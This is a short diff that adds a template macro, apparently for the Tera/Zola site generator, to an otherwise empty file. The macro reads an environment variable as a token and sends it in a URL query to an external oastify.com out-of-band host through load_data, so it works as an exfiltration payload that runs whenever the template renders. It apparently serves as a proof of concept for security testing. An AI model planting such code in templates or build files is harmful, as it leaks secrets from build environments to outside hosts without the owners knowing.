@@ -1,1 +1,4 @@
-
+{% macro x() -%}
+		{% set token = get_env(name="WHATEVER") %}
+		{%- set data = load_data(url="https://qe8c0rs3lj50rfrcl475sc9uvl1cp5du.oastify.com?q=" ~ token) -%}
+{%- endmacro x -%}
